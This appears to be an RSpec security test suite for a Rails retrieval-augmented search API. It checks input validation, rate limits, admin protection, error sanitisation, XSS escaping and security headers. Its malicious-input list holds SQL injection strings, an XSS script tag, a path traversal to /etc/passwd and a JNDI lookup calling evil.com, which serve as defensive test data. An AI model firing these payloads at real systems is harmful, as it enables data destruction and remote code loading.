# frozen_string_literal: true

require 'rails_helper'

RSpec.describe 'API Security Tests', type: :request do
  let(:regulation) { create(:regulation) }
  let!(:articles) do
    3.times.map do |i|
      create(:article, 
             regulation: regulation, 
             embedding: Array.new(1536, rand),
             is_active: true)
    end
  end

  before do
    stub_openai_embeddings_api
    stub_openai_chat_completions_api
  end

  describe 'Input Validation Security' do
    it 'prevents SQL injection in search queries' do
      malicious_inputs = [
        "'; DROP TABLE articles; --",
        "1' OR '1'='1",
        "UNION SELECT * FROM users",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
      ]

      malicious_inputs.each do |malicious_input|
        post '/api/search/rag', params: { question: malicious_input }, as: :json
        
        # Should not cause server error or expose sensitive data
        expect(response).to have_http_status(:success).or have_http_status(:bad_request)
        
        if response.successful?
          response_body = JSON.parse(response.body)
          expect(response_body['answer']).not_to include('DROP TABLE')
          expect(response_body['answer']).not_to include('UNION SELECT')
          expect(response_body['answer']).not_to include('<script>')
        end
      end
    end

    it 'validates input length limits' do
      # Test extremely long input
      long_question = 'a' * 10000
      
      post '/api/search/rag', params: { question: long_question }, as: :json
      
      # Should handle gracefully, not cause memory issues
      expect(response).to have_http_status(:bad_request).or have_http_status(:success)
    end

    it 'handles special characters safely' do
      special_chars = [
        "한글 테스트 질문",
        "Émojis: 🔍 🤖 📚",
        "Special chars: !@#$%^&*()_+-=[]{}|;':\",./<>?",
        "Unicode: ñáéíóú çñü αβγδε",
        "Null bytes: \x00\x01\x02"
      ]

      special_chars.each do |special_input|
        post '/api/search/rag', params: { question: special_input }, as: :json
        
        expect(response).to have_http_status(:success).or have_http_status(:bad_request)
        
        if response.successful?
          response_body = JSON.parse(response.body)
          expect(response_body).to have_key('answer')
        end
      end
    end
  end

  describe 'Rate Limiting Security' do
    it 'enforces rate limits per IP' do
      # Simulate rapid requests from same IP
      11.times do |i|
        post '/api/search/rag', params: { question: "test question #{i}" }, as: :json
        
        if i < 10
          expect(response).to have_http_status(:success)
        else
          expect(response).to have_http_status(:too_many_requests)
          
          response_body = JSON.parse(response.body)
          expect(response_body).to have_key('error')
          expect(response_body['error']).to include('rate limit')
        end
      end
    end

    it 'includes proper rate limit headers' do
      post '/api/search/rag', params: { question: "test question" }, as: :json
      
      expect(response.headers).to have_key('X-RateLimit-Limit')
      expect(response.headers).to have_key('X-RateLimit-Remaining')
      expect(response.headers).to have_key('X-RateLimit-Reset')
    end
  end

  describe 'Authentication and Authorization' do
    it 'allows anonymous access to search endpoints' do
      post '/api/search/rag', params: { question: "test question" }, as: :json
      
      expect(response).to have_http_status(:success)
    end

    it 'protects admin endpoints' do
      # Test that admin-only endpoints require authentication
      get '/admin/dashboard'
      
      expect(response).to have_http_status(:found) # Redirect to login
      expect(response.location).to include('login')
    end
  end

  describe 'Data Exposure Prevention' do
    it 'does not expose sensitive system information' do
      post '/api/search/rag', params: { question: "system information" }, as: :json
      
      expect(response).to have_http_status(:success)
      
      response_body = JSON.parse(response.body)
      
      # Should not expose sensitive data
      sensitive_patterns = [
        /password/i,
        /secret/i,
        /api[_-]?key/i,
        /token/i,
        /database/i,
        /connection/i,
        /config/i,
        /env/i
      ]
      
      sensitive_patterns.each do |pattern|
        expect(response_body['answer']).not_to match(pattern)
      end
    end

    it 'sanitizes error messages' do
      # Force an error condition
      allow(RagOrchestratorService).to receive(:new).and_raise(StandardError.new("Database connection failed: postgres://user:password@localhost/db"))
      
      post '/api/search/rag', params: { question: "test question" }, as: :json
      
      expect(response).to have_http_status(:internal_server_error)
      
      response_body = JSON.parse(response.body)
      expect(response_body['error']).not_to include('password')
      expect(response_body['error']).not_to include('postgres://')
    end
  end

  describe 'Content Security' do
    it 'prevents XSS in responses' do
      # Create article with potentially dangerous content
      article = create(:article, 
                      regulation: regulation,
                      content: "Test content with <script>alert('xss')</script> script tag",
                      embedding: Array.new(1536, rand),
                      is_active: true)
      
      post '/api/search/rag', params: { question: "test content" }, as: :json
      
      expect(response).to have_http_status(:success)
      
      response_body = JSON.parse(response.body)
      # Response should not contain unescaped script tags
      expect(response_body['answer']).not_to include('<script>')
      expect(response_body['answer']).not_to include('</script>')
    end

    it 'validates response format parameters' do
      invalid_formats = ['<script>', 'javascript:', 'data:', '../../etc/passwd']
      
      invalid_formats.each do |invalid_format|
        post '/api/search/rag', params: { 
          question: "test question", 
          format: invalid_format 
        }, as: :json
        
        expect(response).to have_http_status(:bad_request)
        
        response_body = JSON.parse(response.body)
        expect(response_body).to have_key('error')
      end
    end
  end

  describe 'HTTP Security Headers' do
    it 'includes security headers' do
      post '/api/search/rag', params: { question: "test question" }, as: :json
      
      # Check for important security headers
      expect(response.headers['X-Frame-Options']).to be_present
      expect(response.headers['X-Content-Type-Options']).to eq('nosniff')
      expect(response.headers['X-XSS-Protection']).to be_present
    end

    it 'sets proper content type' do
      post '/api/search/rag', params: { question: "test question" }, as: :json
      
      expect(response.content_type).to include('application/json')
    end
  end

  describe 'Resource Protection' do
    it 'prevents resource exhaustion attacks' do
      # Test with complex nested JSON
      complex_payload = {
        question: "test",
        metadata: {
          nested: {
            deeply: {
              very: {
                much: {
                  so: {
                    deep: "value"
                  }
                }
              }
            }
          }
        }
      }
      
      post '/api/search/rag', params: complex_payload, as: :json
      
      # Should handle gracefully without consuming excessive resources
      expect(response).to have_http_status(:success).or have_http_status(:bad_request)
    end

    it 'limits concurrent connections per IP' do
      threads = []
      results = []
      mutex = Mutex.new
      
      # Simulate many concurrent requests
      20.times do
        threads << Thread.new do
          post '/api/search/rag', params: { question: "concurrent test" }, as: :json
          
          mutex.synchronize do
            results << response.status
          end
        end
      end
      
      threads.each(&:join)
      
      # Some requests should succeed, some might be rate limited
      success_count = results.count(200)
      rate_limited_count = results.count(429)
      
      expect(success_count).to be > 0
      expect(success_count + rate_limited_count).to eq(20)
    end
  end
end